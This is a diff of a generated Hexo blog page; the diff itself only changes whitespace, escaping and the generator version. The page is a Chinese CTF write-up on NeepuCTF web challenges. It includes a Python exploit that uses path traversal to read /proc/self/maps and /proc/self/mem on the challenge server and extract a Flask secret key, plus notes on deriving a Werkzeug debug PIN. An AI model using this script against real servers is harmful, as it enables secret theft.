@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
@@ -290,15 +290,15 @@
 <p>当时做题的时候一直用<code>/proc/sys/kernel/random/boot_id</code>  <code> /proc/self/cgroup</code>去算 一直是错的</p>
 <p>不过这里也不是说脚本中提到的是错的 而是做题的时候最好都试一遍 qwq</p>
 <p>应该是先去读<code>/etc/machine-id</code>，如果读不到,那么就是<code>/proc/sys/kernel/random/boot_id</code>和<code>/proc/self/cgroup</code>拼接了  </p>
-<p>计算出来之后 命令执行即可    </p>
+<p>计算出来之后 命令执行即可	</p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684847479030-dc13e6dc-8671-4aca-800c-ff56cc7245e3.png" alt="img"></p>
 <h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>赛后了解了一下 发现预期解太难了 是根据2022年蓝帽杯初赛改编的</p>
-<p>然后这里key的确是伪造不出来 但是任何信息都是存在内存里 可以通过去读内存读出来 借用p神的语句<a target="_blank" rel="noopener" href="https://erroratao.github.io/2022/07/10/File_Session/#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3">https://erroratao.github.io/2022/07/10/File_Session/#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3</a></p>
+<p>然后这里key的确是伪造不出来 但是任何信息都是存在内存里 可以通过去读内存读出来 借用p神的语句<a target="_blank" rel="noopener" href="https://erroratao.github.io/2022/07/10/File_Session/#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3">https://erroratao.github.io/2022/07/10/File_Session&#x2F;#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3</a></p>
 <p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684847734991-7cd63f83-6f22-46aa-83d3-406c8efd6f6e.png" alt="img"></p>
 <p>这里直接贴上Boogipop 亮sensei的脚本 看得出来也是从p神稍加修改 而我连脚本都看不懂 尼玛就菜的离谱 暑假一定要去系统学一下python 好好锻炼锻炼自己写脚本的能力</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># print(str(base64.b64encode(os.urandom(30)).decode()) + &quot;*NeepuCTF*&quot;)</span></span><br><span class="line"><span class="comment"># pollution_url=&quot;http://localhost:8848/?name=os.path.pardir&amp;m1sery=boogipop&quot;</span></span><br><span class="line"><span class="comment"># flagurl=&quot;http://localhost:8848/../../flag&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://neepusec.fun:28954//r3aDF1le&quot;</span></span><br><span class="line">maps_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?filename=../../../proc/self/maps&quot;</span></span><br><span class="line">maps_reg = <span class="string">&quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;</span></span><br><span class="line">maps = re.findall(maps_reg, requests.get(maps_url).text)</span><br><span class="line"><span class="built_in">print</span>(maps)</span><br><span class="line">cookie=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> maps:</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    start, end = m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>], m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    Offset, Length = <span class="built_in">str</span>(<span class="built_in">int</span>(start, <span class="number">16</span>)), <span class="built_in">str</span>(<span class="built_in">int</span>(end, <span class="number">16</span>))</span><br><span class="line">    read_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?filename=../../../proc/self/mem&amp;start=<span class="subst">&#123;Offset&#125;</span>&amp;end=<span class="subst">&#123;Length&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(read_url)</span><br><span class="line">    s = requests.get(read_url).content</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    rt = re.findall(<span class="string">b&quot;(.&#123;40&#125;)\*NeepuCTF\*&quot;</span>, s)</span><br><span class="line">    <span class="keyword">if</span> rt:</span><br><span class="line">        <span class="built_in">print</span>(rt[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
 
-<p>脚本大致过程就是 先去读取/proc/self/maps的信息 </p>
+<p>脚本大致过程就是 先去读取&#x2F;proc&#x2F;self&#x2F;maps的信息 </p>
 <p>然后通过map里栈的地址  再去去正则匹配里面的信息 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maps_reg = &quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;</span><br></pre></td></tr></table></figure>
 
@@ -318,7 +318,7 @@
 <p>通过反弹shell 就ok了 真的太强了</p>
 <p>发现还是得去老老实实去刷一遍ctfshow的ssti 去弄明白不同的paylaod</p>
 <h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>当时做这道题 一看界面是空白的 各种尝试之后还是啥都没有 就放弃了</p>
-<p>看了wp 返现是php&lt;=7.4.21远程源码泄露的漏洞  <a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1530845.html">https://cn-sec.com/archives/1530845.html</a>    </p>
+<p>看了wp 返现是php&lt;&#x3D;7.4.21远程源码泄露的漏洞  <a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1530845.html">https://cn-sec.com/archives/1530845.html</a>	</p>
 <p>其实关键是怎么发现php版本???? 并且检索到相关漏洞</p>
 <p>可能大佬一眼就丁真了 对我比较困难</p>
 <p>然后抓包 构造一个如下的请求头</p>
